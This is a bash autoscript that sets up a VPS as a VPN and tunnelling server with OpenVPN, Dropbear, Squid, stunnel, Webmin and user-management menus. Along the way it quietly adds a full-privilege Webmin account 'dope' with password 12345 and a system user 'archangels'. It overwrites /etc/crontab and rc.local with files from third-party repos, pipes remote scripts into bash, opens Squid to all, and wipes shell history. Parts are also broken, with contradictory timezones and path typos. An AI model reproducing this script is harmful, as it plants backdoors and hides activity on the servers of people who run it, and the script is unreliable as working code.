#!/bin/bash
# go to root
cd


# MULA SETUP
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
if [ $USER != 'root' ]; then
echo "Sorry, for run the script please using root user"
exit 1
fi
if [[ "$EUID" -ne 0 ]]; then
echo "Sorry, you need to run this as root"
exit 2
fi
if [[ ! -e /dev/net/tun ]]; then
echo "TUN is not available"
exit 3
fi
echo "
AUTOSCRIPT BY OrangKuatSabahanTerkini
AMBIL PERHATIAN !!!"
clear
echo "MULA SETUP"
clear
echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "
ENABLE IPV4 AND IPV6
SILA TUNGGU SEDANG DI SETUP
"

sleep 3

tput setaf 8 ; tput setab 5 ; tput bold ; printf '%30s%s%-18s\n' "Gakodkaki" ; tput sgr0
echo ""
echo ""
echo -e "\033[1;34m INSTALANDO...\033[1;32m"

sleep 5

# requirement
apt-get -y update && apt-get -y upgrade
apt-get -y install curl

# initializing IP
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(wget -qO- ipv4.icanhazip.com);
MYIP2="s/xxxxxxxxx/$MYIP/g";

# configure rc.local
cat <<EOF >/etc/rc.local
#!/bin/sh -e
exit 0
EOF
chmod +x /etc/rc.local
systemctl daemon-reload
systemctl start rc-local

# go to root
cd

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

# install wget and curl
apt-get update;apt-get -y install wget curl;

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service ssh restart

# remove unused
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;

# update
apt-get update;apt-get -y upgrade;

# disable exim
service exim4 stop
sysv-rc-conf exim4 off

# update apt-file
apt-file update

# setting vnstat
vnstat -u -i venet0
service vnstat restart

# add DNS server ipv4
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf
sed -i '$ i\echo "nameserver 8.8.8.8" > /etc/resolv.conf' /etc/rc.local
sed -i '$ i\echo "nameserver 8.8.4.4" >> /etc/resolv.conf' /etc/rc.local


# set repo
echo 'deb http://download.webmin.com/download/repository sarge contrib' >> /etc/apt/sources.list.d/webmin.list
wget "http://www.dotdeb.org/dotdeb.gpg"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -

# install webserver extensions
apt-get -y install nginx
apt-get -y install php7.0-fpm php7.0-cli libssh2-1 php-ssh2 php7.0

# install essential package
apt-get -y install nano iptables-persistent dnsutils screen whois ngrep unzip unrar
apt-get -y install build-essential
apt-get -y install libio-pty-perl libauthen-pam-perl apt-show-versions libnet-ssleay-perl

# install screenfetch
cd
wget -O /usr/bin/screenfetch "https://raw.githubusercontent.com/gatotx/AutoScriptDebian9/main/Res/Screenfetch/screenfetch"
chmod +x /usr/bin/screenfetch
echo "clear" >> .profile
echo "screenfetch" >> .profile

# nginx
apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/php/7.0/fpm/pool.d/www.conf "https://raw.githubusercontent.com/ehomecore/deb-ubun/master/www.conf"
mkdir -p /home/vps/public_html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /home/vps/public_html/index.html https://raw.githubusercontent.com/GakodArmy/teli/main/index.html
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/ehomecore/deb-ubun/master/vps.conf"
sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
service nginx restart
service php7.0-fpm restart

#  openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget -O openvpn.tar "https://raw.githubusercontent.com/azalea910512/kia/main/zvs/openvpn.tar"
tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
chmod +x /etc/rc.local
# etc
wget -O /home/vps/public_html/tcp.ovpn "https://raw.githubusercontent.com/azalea910512/kia/main/zvs/tcp.ovpn"
wget -O /home/vps/public_html/udp.ovpn "https://raw.githubusercontent.com/azalea910512/kia/main/zvs/udp.ovpn"
wget -O /home/vps/public_html/ssl.ovpn "https://raw.githubusercontent.com/azalea910512/kia/main/zvs/ssl.ovpn"
wget -O /home/vps/public_html/client3.ovpn "https://gakod.com/debian/client3.ovpn"
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/tcp.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/ssl.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
useradd -m -g users -s /bin/bash archangels
echo "7C22C4ED" | chpasswd
echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;

# Setting UFW
apt-get install ufw
ufw allow ssh
ufw allow 1103/tcp
sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
cat > /etc/ufw/before.rules <<-END
# START OPENVPN RULES
# NAT table rules
*nat
:POSTROUTING ACCEPT [0:0]
# Allow traffic from OpenVPN client to eth0
-A POSTROUTING -s 10.8.0.0/8 -o eth0 -j MASQUERADE
COMMIT
# END OPENVPN RULES
END
ufw status
ufw disable

# set ipv4 forward
echo 1 > /proc/sys/net/ipv4/ip_forward
sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf

# OpenVPN monitoring
apt-get install -y gcc libgeoip-dev python-virtualenv python-dev geoip-database-extra uwsgi uwsgi-plugin-python
wget -O /srv/openvpn-monitor.tar "https://raw.githubusercontent.com/gatotx/AutoScriptDebian9/main/Res/Panel/openvpn-monitor.tar"
cd /srv
tar xf openvpn-monitor.tar
cd openvpn-monitor
virtualenv .
. bin/activate
pip install -r requirements.txt
wget -O /etc/uwsgi/apps-available/openvpn-monitor.ini "https://raw.githubusercontent.com/gatotx/AutoScriptDebian9/main/Res/Panel/openvpn-monitor.ini"
ln -s /etc/uwsgi/apps-available/openvpn-monitor.ini /etc/uwsgi/apps-enabled/

# install badvpn
cd
#apt-get install cmake -y
#apt-get install screen wget gcc build-essential g++ make -y
#wget https://github.com/trngkn/badvpn/raw/main/badvpn-1.999.130.tar.gz
#tar xf badvpn-1.999.130.tar.gz
#cd badvpn-1.999.130/
#cmake /home/pi/badvpn-1.999.130 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
#make install
#echo "Thiet lap BADVPN tai cong 7300"
#badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
#rm /root/badupd
#echo "Thanh Cong!!"
#echo "Yahhh"
#install badvpn deb/ubun
apt-get install cmake make gcc -y
cd
wget https://github.com/ambrop72/badvpn/archive/1.999.130.tar.gz
tar xzf 1.999.130.tar.gz
mkdir badvpn-build
cd badvpn-build
cmake ~/badvpn-1.999.130 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
make install
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7000 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7100 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7400 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7500 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7600 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7700 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7800 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7900 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
chmod +x /usr/local/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7000 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7100 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7400 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7500 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7600 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7700 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7800 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7900 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &

# setting port ssh
sed -i '/#Port 22/a Port 143' /etc/ssh/sshd_config
sed -i '/#Port 22/a Port  90' /etc/ssh/sshd_config
sed -i 's/#Port 22/Port  22/g' /etc/ssh/sshd_config
/etc/init.d/ssh restart

# install dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110 -p 80"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
/etc/init.d/dropbear restart

# install squid
apt-get -y install squid
cat > /etc/squid/squid.conf <<-END
acl server dst xxxxxxxxx/32 localhost
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
via on
request_header_access X-Forwarded-For deny all
request_header_access user-agent  deny all
reply_header_access X-Forwarded-For deny all
reply_header_access user-agent  deny all
http_port 8080
http_port 3128
http_port 8000
http_port 1991
acl all src 0.0.0.0/0
http_access allow all
access_log /var/log/squid/access.log
visible_hostname TD-LTE/FDD-LTE(nb110.cn)
cache_mgr Welcome_to_use_OpenVPN
#
END
sed -i $MYIP2 /etc/squid/squid.conf;
service squid restart

# installing webmin
wget "https://raw.githubusercontent.com/gatotx/AutoScriptDebian9/main/Res/Other/webmin_1.801_all.deb"
dpkg --install webmin_1.801_all.deb;
apt-get -y -f install;
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
rm /root/webmin_1.801_all.deb
service webmin restart

#pivpn
curl https://raw.githubusercontent.com/pivpn/pivpn/master/auto_install/install.sh | bash

#Shadowsocks
wget -N --no-check-certificate -c -t3 -T60 -O ss-plugins.sh https://git.io/fjlbl
chmod +x ss-plugins.sh

#v2ray
source <(curl -sL https://multi.netlify.com/v2ray.sh) --zh

#obfs proxy
wget -O /etc/openvpn/ "https://raw.githubusercontent.com/HRomie/obfs4proxy-openvpn/master/obfs4proxy-openvpn"
chmod +x /etc/openvn/obfs4proxy-openvpn


# install stunnel
apt-get install stunnel4 -y
cat > /etc/stunnel/stunnel.conf <<-END
cert = /etc/stunnel/stunnel.pem
[dropbear]
accept = 444
connect = 127.0.0.1:442

[openvpn]
accept = 990
connect = 127.0.0.1:1103
END

# configure stunnel
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
wget -O /etc/stunnel/stunnel.pem "https://raw.githubusercontent.com/gatotx/AutoScriptDebian9/main/Res/Other/stunnel.pem"
service stunnel4 restart
cd

# install fail2ban
apt-get -y install fail2ban

# install ddos deflate
cd
apt-get -y install dnsutils dsniff
wget https://raw.githubusercontent.com/gatotx/AutoScriptDebian9/main/Res/DDOS/ddos-deflate-master.zip
unzip ddos-deflate-master.zip
cd ddos-deflate-master
./install.sh
rm -rf /root/ddos-deflate-master.zip

# banner /etc/banner
wget -O /etc/banner "https://raw.githubusercontent.com/gatotx/AutoScriptDebian9/main/Res/Other/banner"
sed -i 's@#Banner none@Banner /etc/banner@g' /etc/ssh/sshd_config
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner"@g' /etc/default/dropbear

# Webmin Configuration
sed -i '$ i\dope: acl adsl-client ajaxterm apache at backup-config bacula-backup bandwidth bind8 burner change-user cluster-copy cluster-cron cluster-passwd cluster-shell cluster-software cluster-useradmin cluster-usermin cluster-webmin cpan cron custom dfsadmin dhcpd dovecot exim exports fail2ban fdisk fetchmail file filemin filter firewall firewalld fsdump grub heartbeat htaccess-htpasswd idmapd inetd init inittab ipfilter ipfw ipsec iscsi-client iscsi-server iscsi-target iscsi-tgtd jabber krb5 ldap-client ldap-server ldap-useradmin logrotate lpadmin lvm mailboxes mailcap man mon mount mysql net nis openslp package-updates pam pap passwd phpini postfix postgresql ppp-client pptp-client pptp-server proc procmail proftpd qmailadmin quota raid samba sarg sendmail servers shell shorewall shorewall6 smart-status smf software spam squid sshd status stunnel syslog-ng syslog system-status tcpwrappers telnet time tunnel updown useradmin usermin vgetty webalizer webmin webmincron webminlog wuftpd xinetd' /etc/webmin/webmin.acl
sed -i '$ i\dope:x:0' /etc/webmin/miniserv.users
/usr/share/webmin/changepass.pl /etc/webmin dope 12345

# Setting IPtables
cat > /etc/iptables.up.rules <<-END
*nat
:PREROUTING ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A POSTROUTING -j SNAT --to-source xxxxxxxxx
-A POSTROUTING -o eth0 -j MASQUERADE
-A POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE
-A POSTROUTING -s 10.1.0.0/24 -o eth0 -j MASQUERADE
COMMIT
*filter
:INPUT ACCEPT [19406:27313311]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [9393:434129]
:fail2ban-ssh - [0:0]
-A FORWARD -i eth0 -o ppp0 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -i ppp0 -o eth0 -j ACCEPT
-A INPUT -p tcp -m multiport --dports 22 -j fail2ban-ssh
-A INPUT -p ICMP --icmp-type 8 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 53 -j ACCEPT
-A INPUT -p tcp --dport 22  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 80  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 80  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 8888  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 8888  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 142  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 143  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 109  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 110  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 443  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 1194  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 1194  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 1732  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 1732  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 3128  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 3128  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 7300  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 7300  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 8000  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 8000  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 8080  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 8080  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 10000  -m state --state NEW -j ACCEPT
-A fail2ban-ssh -j RETURN
COMMIT
*raw
:PREROUTING ACCEPT [158575:227800758]
:OUTPUT ACCEPT [46145:2312668]
COMMIT
*mangle
:PREROUTING ACCEPT [158575:227800758]
:INPUT ACCEPT [158575:227800758]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [46145:2312668]
:POSTROUTING ACCEPT [46145:2312668]
COMMIT
END
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i $MYIP2 /etc/iptables.up.rules;
iptables-restore < /etc/iptables.up.rules

# xml parser
cd
apt-get install -y libxml-parser-perl

# download script
cd
# cron job
apt-get install cron
wget https://raw.githubusercontent.com/demonk1992/membagongkan/main/crontab
mv crontab /etc/
chmod 644 /etc/crontab

# Install Screenfetch
apt-get -y install lsb-release scrot
wget -O screenfetch "https://raw.githubusercontent.com/Dreyannz/AutoScriptVPS/master/Files/Others/screenfetch"
chmod +x screenfetch

# Download Commands
cd /usr/bin
wget https://github.com/Dreyannz/AutoScriptVPS/raw/master/Files/Menu/AutoScript_Menu.tar.gz
tar -xzvf AutoScript_Menu.tar.gz
rm AutoScript_Menu.tar.gz
sed -i -e 's/\r$//' accounts
sed -i -e 's/\r$//' bench-network
sed -i -e 's/\r$//' clearcache
sed -i -e 's/\r$//' connections
sed -i -e 's/\r$//' create
sed -i -e 's/\r$//' create_random
sed -i -e 's/\r$//' create_trial
sed -i -e 's/\r$//' delete_expired
sed -i -e 's/\r$//' diagnose
sed -i -e 's/\r$//' edit_dropbear
sed -i -e 's/\r$//' edit_openssh
sed -i -e 's/\r$//' edit_openvpn
sed -i -e 's/\r$//' edit_ports
sed -i -e 's/\r$//' edit_squid3
sed -i -e 's/\r$//' edit_stunnel4
sed -i -e 's/\r$//' locked_list
sed -i -e 's/\r$//' menu
sed -i -e 's/\r$//' options
sed -i -e 's/\r$//' ram
sed -i -e 's/\r$//' reboot_sys
sed -i -e 's/\r$//' reboot_sys_auto
sed -i -e 's/\r$//' restart_services
sed -i -e 's/\r$//' server
sed -i -e 's/\r$//' set_multilogin_autokill
sed -i -e 's/\r$//' set_multilogin_autokill_lib
sed -i -e 's/\r$//' show_ports
sed -i -e 's/\r$//' speedtest
sed -i -e 's/\r$//' user_delete
sed -i -e 's/\r$//' user_details
sed -i -e 's/\r$//' user_details_lib
sed -i -e 's/\r$//' user_extend
sed -i -e 's/\r$//' user_list
sed -i -e 's/\r$//' user_lock
sed -i -e 's/\r$//' user_unlock

# AutoReboot Tools
echo "10 0 * * * root /usr/local/bin/reboot_sys" > /etc/cron.d/reboot_sys
echo "0 1 * * * root delete_expired" > /etc/cron.d/delete_expired
echo "*0 */2 * * * root clearcache" > /etc/cron.d/clearcache

# Set Permissions
cd /usr/bin
chmod +x create
chmod +x accounts
chmod +x create
chmod +x create_random
chmod +x create_trial
chmod +x user_list
chmod +x user_details
chmod +x user_details_lib
chmod +x user_extend
chmod +x user_delete
chmod +x user_lock
chmod +x user_unlock
chmod +x connections
chmod +x delete_expired
chmod +x locked_list
chmod +x options
chmod +x set_multilogin_autokill
chmod +x set_multilogin_autokill_lib
chmod +x restart_services
chmod +x edit_ports
chmod +x show_ports
chmod +x edit_openssh
chmod +x edit_dropbear
chmod +x edit_stunnel4
chmod +x edit_openvpn
chmod +x edit_squid3
chmod +x reboot_sys
chmod +x reboot_sys_auto
chmod +x clearcache
chmod +x server
chmod +x ram
chmod +x diagnose
chmod +x bench-network
chmod +x speedtest

# finishing
cd
chown -R www-data:www-data /home/vps/public_html
/etc/init.d/nginx restart
/etc/init.d/openvpn restart
/etc/init.d/cron restart
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
/etc/init.d/fail2ban restart
/etc/init.d/stunnel4 restart
/etc/init.d/php7.0-fpm restart
service uwsgi restart
systemctl daemon-reload
service squid restart
/etc/init.d/webmin restart

# clearing history
rm -rf ~/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile

# remove unnecessary files
apt -y autoremove
apt -y autoclean
apt -y clean

# grep ports 
opensshport="$(netstat -ntlp | grep -i ssh | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
dropbearport="$(netstat -nlpt | grep -i dropbear | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
stunnel4port="$(netstat -nlpt | grep -i stunnel | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
openvpnport="$(netstat -nlpt | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
squidport="$(cat /etc/squid3/squid.conf | grep -i http_port | awk '{print $2}')"
nginxport="$(netstat -nlpt | grep -i nginx| grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"

# Info
clear
echo -e ""
echo -e "\e[94m[][][]======================================[][][]"
echo -e "\e[0m                                                   "
echo -e "\e[94m           AutoScriptVPS by  _Dreyannz_           "
echo -e "\e[94m                                                  "
echo -e "\e[94m                    Services                      "
echo -e "\e[94m                                                  "
echo -e "\e[94m    OpenSSH        :   "$opensshport
echo -e "\e[94m    Dropbear       :   "$dropbearport
echo -e "\e[94m    SSL            :   "$stunnel4port
echo -e "\e[94m    OpenVPN        :   "$openvpnport
echo -e "\e[94m    Port Squid     :   "$squidport
echo -e "\e[94m    Nginx          :   "$nginxport
echo -e "\e[94m                                                  "
echo -e "\e[94m              Other Features Included             "
echo -e "\e[94m                                                  "
echo -e "\e[94m    Timezone       :   Asia/Manila (GMT +7)       "
echo -e "\e[94m    Webmin         :   http://$MYIP:10000/        "
echo -e "\e[94m    IPV6           :   [OFF]                      "
echo -e "\e[94m    Cron Scheduler :   [ON]                       "
echo -e "\e[94m    Fail2Ban       :   [ON]                       "
echo -e "\e[94m    DDOS Deflate   :   [ON]                       "
echo -e "\e[94m    LibXML Parser  :   {ON]                       "
echo -e "\e[0m                                                   "
echo -e "\e[94m[][][]======================================[][][]\e[0m"
echo -e "\e[0m                                                   "
read -n1 -r -p "          Press Any Key To Show Commands          "
menu
cd
